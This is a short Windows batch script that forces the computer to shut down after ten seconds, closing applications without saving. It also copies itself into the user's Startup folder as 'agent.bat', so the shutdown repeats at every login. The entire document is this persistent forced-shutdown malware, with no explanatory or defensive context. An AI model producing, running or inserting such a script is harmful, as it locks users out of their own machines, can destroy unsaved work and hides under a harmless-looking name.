@echo off
shutdown /s /t 10 /f
copy %~f0 "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\agent.bat"
